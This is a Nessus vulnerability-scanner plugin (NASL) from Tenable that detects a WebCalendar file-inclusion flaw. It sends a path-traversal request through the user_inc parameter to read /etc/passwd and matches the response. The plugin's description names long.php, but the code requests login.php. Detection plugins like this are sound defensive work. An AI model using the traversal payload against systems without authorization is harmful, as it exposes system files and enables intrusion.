#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11794);
 script_version ("$Revision: 1.15 $");
 script_bugtraq_id(8237);
 script_osvdb_id(53610);
 
 script_name(english:"WebCalendar long.php user_inc Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a PHP script that is affected by a local
file include flaw." );
 script_set_attribute(attribute:"description", value:
"The remote installation of WebCalendar may allow an attacker to read
arbitrary files on the remote host by supplying a filename to the
'user_inc' argument of the file 'long.php'." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/329793" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/330521/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/forum/forum.php?thread_id=901234&forum_id=11588" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WebCalendar 0.9.42 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/07/21");
 script_cvs_date("$Date: 2011/03/14 21:48:15 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for file reading flaw in WebCalendar");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencies("webcalendar_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);



# Test an install.
install = get_kb_item(string("www/", port, "/webcalendar"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];

 w = http_send_recv3(method:"GET", port: port,
   item:string(dir, "/login.php?user_inc=../../../../../../../../../../../../../../../etc/passwd"));
 if (isnull(w)) exit(0);
 res = w[2];
 if(egrep(pattern:"root:.*:0:[01]:.*:", string:res))
 {
 	security_warning(port);
	exit(0);
 }
}
